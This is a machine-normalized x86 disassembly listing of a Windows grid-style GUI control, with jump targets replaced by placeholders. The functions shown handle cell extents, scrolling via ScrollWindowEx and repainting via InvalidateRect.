test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403324
test al al
jne r-xdata
mov esi [ ebp - 0x14 ]
mov esi [ ebp - 0xc ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
jmp r-xdata
mov esi [ ebp - 0x18 ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d9e7
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41d3ac
retn
mov ecx esi
xor edx edx
mov eax ebx
call sub_41d1bc
mov eax [ ebp - 0x4 ]
call sub_4345b8
mov edx eax
mov ecx esi
mov eax ebx
call sub_41d15c
jmp r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41d1bc
mov eax [ ebp - 0x4 ]
call sub_4345fc
mov ecx eax
mov edx esi
mov eax ebx
call sub_41d15c
sub_45da0c
push ebp
mov ebp esp
push esi
mov esi eax
mov al [ ebp + 0x8 ]
push eax
push 0x1
mov eax esi
call sub_45e3b4
mov eax esi
call sub_4603e8
mov eax esi
mov si 0xffeb
call sub_403324
pop esi
pop ebp
retn 0x4
sub_45da38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
dec edx
sub edx eax
jl r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
xor esi esi
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add esi eax
cmp esi [ ebx + 0xc ]
jle r-xdata
sub_45da94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax [ ebx + 0x10 ]
cmp esi eax
jle r-xdata
mov eax [ ebx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_45da38
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax ebx
mov edx esi
call sub_45da38
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi eax
mov eax [ ebx + 0x20 ]
dec eax
cmp esi eax
jge r-xdata
mov eax [ ebx + 0x1c ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
add eax [ edx ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
mov eax ebx
mov edx esi
call sub_45da38
test eax eax
jne r-xdata
inc esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx 0x10
call sub_402b3c
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebx + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jge r-xdata
dec esi
mov al [ ebp - 0x5 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov [ ebp - 0x5 ] 0x1
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
sub_45db70
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x10
call sub_402b3c
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0xc ]
jg r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_45cd48
mov eax [ ebp - 0x68 ]
inc eax
mov esi [ ebp - 0x14 ]
cmp eax esi
jl r-xdata
mov eax [ ebp - 0x38 ]
inc eax
cmp eax [ ebp - 0x10 ]
jl r-xdata
push ebp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
lea eax [ ebp - 0x78 ]
mov ecx [ ebp - 0xc ]
mov edx esi
call sub_45da94
pop ecx
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_403324
test al al
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
mov eax [ ebp - 0x4 ]
add eax 0xc
push eax
lea eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_45da94
pop ecx
mov eax [ ebx + 0x208 ]
call sub_41d26c
test al al
jne r-xdata
mov esi [ ebp - 0x4 ]
mov esi [ esi ]
mov eax ebx
call sub_4345b8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax ebx
call sub_4345b8
sub eax esi
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_45dc60
mov edx [ eax + 0x238 ]
mov [ eax + 0x258 ] edx
mov edx [ eax + 0x23c ]
mov [ eax + 0x25c ] edx
mov edx [ eax + 0x258 ]
mov [ eax + 0x228 ] edx
mov edx [ eax + 0x25c ]
mov [ eax + 0x22c ] edx
mov edx [ eax + 0x228 ]
mov [ eax + 0x210 ] edx
mov edx [ eax + 0x22c ]
mov [ eax + 0x214 ] edx
test [ eax + 0x249 ] 0x10
je r-xdata
retn
mov edx [ eax + 0x21c ]
dec edx
mov [ eax + 0x210 ] edx
sub_45dcc0
push esi
add esp 0xfffffff0
mov esi eax
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0xc ] ecx
mov [ esp + 0x8 ] edx
mov edx esp
mov eax esi
call sub_45dcec
add esp 0x10
pop esi
retn
sub_45dcec
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_43b694
test al al
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
push 0x1
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_45db70
push 0x0
lea eax [ esp + 0x14 ]
push eax
mov eax ebx
call sub_43b390
push eax
call InvalidateRect
sub_45dd34
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x238 ]
pop ebp
retn
sub_45dd5c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
pop ebp
retn
sub_45dd78
push ebp
mov ebp esp
add esp 0xfffffff8
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ eax + 0x258 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45cf80
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x25c ]
sub eax [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x258 ]
sub eax [ ebp - 0x8 ]
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax 0x1
cmp eax 0x1
jge r-xdata
sub_45ddd8
push ebp
mov ebp esp
add esp 0xffffffa0
lea edx [ ebp - 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45cd48
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x25c ]
mov eax [ ebp - 0x20 ]
pop edx
sub eax edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x258 ]
mov eax [ ebp - 0x50 ]
pop edx
sub eax edx
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax 0x1
cmp eax 0x1
jge r-xdata
sub_45de2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x74 ]
cmp eax 0x7
ja r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
jmp [ eax * 4 + jump_table_45de4c ]
sub ebx edi
jmp r-xdata
add ebx edi
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_45dd78
pop ecx
imul edi
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_45ddd8
pop ecx
imul edi
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x249 ] 0x40
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_45dd5c
pop ecx
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_45dd34
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xffc8
call sub_403324
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x74 ] 0x4
jne r-xdata
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_45dd5c
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_45dd34
pop ecx
sub ebx eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_45dd34
pop ecx
add ebx eax
jmp r-xdata
dec edi
jne r-xdata
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_45dd5c
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_45dd34
pop ecx
sub ebx eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_45dd5c
pop ecx
mov ebx eax
pop eax
sub ebx eax
jmp r-xdata
sub_45df64
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax + 0x288 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x54 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45fdbc
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4345b8
mov edi eax
mov eax [ ebp + 0x8 ]
sub edi [ eax - 0x6c ]
mov eax esi
cmp eax 0x7
ja r-xdata
test ebx ebx
jge r-xdata
jmp [ eax * 4 + jump_table_45dfb7 ]
mov eax [ ebp - 0x8 ]
sub eax edi
cmp ebx eax
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x208 ]
mov edx r-xdata
call sub_41d2dc
mov edx [ ebp + 0x8 ]
imul [ edx - 0x78 ]
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x208 ]
mov edx r-xdata
call sub_41d2dc
mov edx [ ebp + 0x8 ]
imul [ edx - 0x78 ]
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x78 ]
imul edi
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x78 ]
imul edi
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x249 ] 0x40
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
sub ebx edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x288 ]
cmp ebx eax
je r-xdata
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xffc8
call sub_403324
test al al
jne r-xdata
cmp esi 0x4
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x288 ] ebx
mov edx eax
sub edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor ecx ecx
call sub_45e79c
lea eax [ ebp - 0x18 ]
xor ecx ecx
mov edx 0x10
call sub_402b3c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ ebp - 0x18 ]
call sub_45dcec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45e948
mov eax [ ebp + 0x8 ]
push eax
call sub_45dd5c
pop ecx
mov ebx eax
sub ebx [ ebp - 0x4 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
jmp r-xdata
sub_45e110
push ebp
mov ebp esp
add esp 0xffffff78
push ebx
push esi
push edi
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
lea edi [ ebp - 0x80 ]
mov eax [ ebp - 0x8 ]
mov si 0xffc8
call sub_403324
test al al
je r-xdata
mov [ ebp - 0x78 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov [ ebp - 0x78 ] 0xffffffff
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_45cd48
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov si 0xffb8
call sub_403324
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x88 ]
push eax
lea ecx [ ebp - 0x70 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_45cf80
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x258 ]
mov [ edi ] edx
mov edx [ eax + 0x25c ]
mov [ edi + 0x4 ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1a4 ] 0x0
je r-xdata
mov esi [ edi + 0x4 ]
mov ebx esi
push ebp
mov edx 0x1
mov eax esi
call sub_45de2c
pop ecx
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x23c ]
mov esi [ edi + 0x4 ]
cmp eax esi
jge r-xdata
mov esi [ edi ]
mov ebx esi
push ebp
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_45de2c
pop ecx
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x238 ]
mov esi [ edi ]
cmp eax esi
jge r-xdata
push ebp
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x74 ]
call sub_45df64
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx [ edi ]
mov eax [ ebp - 0x10 ]
call sub_4233b0
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x238 ]
call sub_4233b8
mov [ edi ] eax
mov edx [ edi + 0x4 ]
mov eax [ ebp - 0xc ]
call sub_4233b0
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x23c ]
call sub_4233b8
mov [ edi + 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x258 ]
mov eax [ edi ]
cmp edx eax
jne r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov ecx [ edi + 0x4 ]
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_45e50c
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x25c ]
cmp edx [ edi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_45fddc
test eax eax
jg r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_45fdbc
test eax eax
jg r-xdata
cmp esi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
jmp r-xdata
sub_45e2f8
push ebp
mov ebp esp
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp ecx [ edx ]
jne r-xdata
mov esi ecx
mov edi eax
cmp eax ecx
jge r-xdata
mov [ edx ] eax
jmp r-xdata
cmp esi [ edx ]
jg r-xdata
mov esi eax
mov edi ecx
pop edi
pop esi
pop ebp
retn 0x4
cmp edi [ edx ]
jl r-xdata
cmp eax ecx
jge r-xdata
dec [ edx ]
inc [ edx ]
jmp r-xdata
sub_45e32c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov ax [ ebx + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
push 0x1
push 0x1
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_45e3b4
mov edx esp
mov eax ebx
call sub_45fdfc
mov eax [ esi ]
mov [ ebx + 0x210 ] eax
mov eax [ esi + 0x4 ]
mov [ ebx + 0x214 ] eax
test [ ebx + 0x249 ] 0x10
je r-xdata
mov edx esi
mov eax ebx
call sub_45d674
mov edx esp
mov eax ebx
call sub_45e578
jmp r-xdata
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
add esp 0x10
pop esi
pop ebx
retn
sub_45e3b4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45e4f9
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x20 ]
call sub_45a8b8
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e500
lea eax [ ebp - 0x20 ]
call sub_403e78
retn
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_45fdfc
mov eax [ ebx + 0x228 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x22c ]
mov [ ebp - 0x8 ] eax
mov [ ebx + 0x228 ] esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x22c ] eax
test [ ebx + 0x249 ] 0x20
jne r-xdata
cmp esi [ ebx + 0x21c ]
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_45bc84
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x24c ]
jl r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebx + 0x22c ]
mov [ ebx + 0x214 ] eax
test [ ebx + 0x249 ] 0x10
je r-xdata
test [ ebx + 0x248 ] 0x10
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xdc ]
test al al
je r-xdata
test [ ebx + 0x249 ] 0x10
je r-xdata
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x238 ]
mov [ ebx + 0x228 ] eax
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_45e578
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_45dcc0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_45dcc0
lea edx [ ebx + 0x228 ]
mov eax ebx
call sub_45d674
sub_45e50c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x258 ]
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebx + 0x258 ]
mov [ esp ] eax
mov eax [ ebx + 0x25c ]
mov [ esp + 0x4 ] eax
mov [ ebx + 0x258 ] esi
mov [ ebx + 0x25c ] edi
mov edx esp
mov eax ebx
call sub_45e848
cmp edi [ ebx + 0x25c ]
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_45e578
push ebx
push esi
push edi
add esp 0xffffff90
mov ebx edx
mov edi eax
mov eax edi
call sub_43b694
test al al
je r-xdata
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x1
lea ecx [ esp + 0x4 ]
mov edx ebx
mov eax edi
call sub_45db70
push 0x1
lea edx [ esp + 0x64 ]
mov eax edi
call sub_45fdfc
lea edx [ esp + 0x64 ]
lea ecx [ esp + 0x14 ]
mov eax edi
call sub_45db70
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x10 ]
mov eax esp
call sub_45aa34
mov esi 0x4
lea ebx [ esp + 0x20 ]
push 0x0
push ebx
mov eax edi
call sub_43b390
push eax
call InvalidateRect
add ebx 0x10
dec esi
jne r-xdata
sub_45e5f0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] 0x2
cmp [ ebx + 0x28c ] 0x0
jne r-xdata
test esi esi
jne r-xdata
or [ ebp - 0x8 ] 0x4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov si 0xffc8
call sub_403324
test al al
jne r-xdata
mov eax [ edi + 0x34 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x4 ]
xor edx edx
call sub_412484
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_43b390
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx [ edi + 0x34 ]
xor eax eax
call sub_412484
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push 0x0
mov eax ebx
call sub_43b390
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x34 ]
mov eax [ edi + 0x4 ]
call sub_412484
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_43b390
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x34 ]
xor eax eax
call sub_412484
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push 0x0
mov eax ebx
call sub_43b390
push eax
call ScrollWindowEx
jmp r-xdata
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4345b8
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4345b8
sub eax [ edi + 0xc ]
xor edx edx
pop ecx
call sub_412484
neg [ ebp - 0x4 ]
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x4 ]
xor edx edx
call sub_412484
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_45fdfc
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_45dcec
test [ ebx + 0x249 ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_43b390
push eax
call ScrollWindowEx
jmp r-xdata
sub_45e79c
push ebx
push esi
push edi
add esp 0xffffffa0
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_45cd48
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_45e5f0
add esp 0x60
pop edi
pop esi
pop ebx
retn
sub_45e7c4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
inc edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ esi ] ecx
dec edx
sub edx eax
jl r-xdata
mov [ ebp - 0x9 ] 0x1
neg [ esi ]
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
call sub_45dce4
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ esi ] eax
mov eax [ ebx + 0x8 ]
sub eax [ ebx + 0x4 ]
cmp eax [ esi ]
jge r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45e848
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45e948
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_45cd48
push ebp
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x258 ]
mov edx [ ebx ]
lea eax [ ebp - 0x70 ]
call sub_45e7c4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffa7
call sub_403324
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x25c ]
mov edx [ ebx + 0x4 ]
lea eax [ ebp - 0x40 ]
call sub_45e7c4
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45e5f0
sub_45e8c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx edx
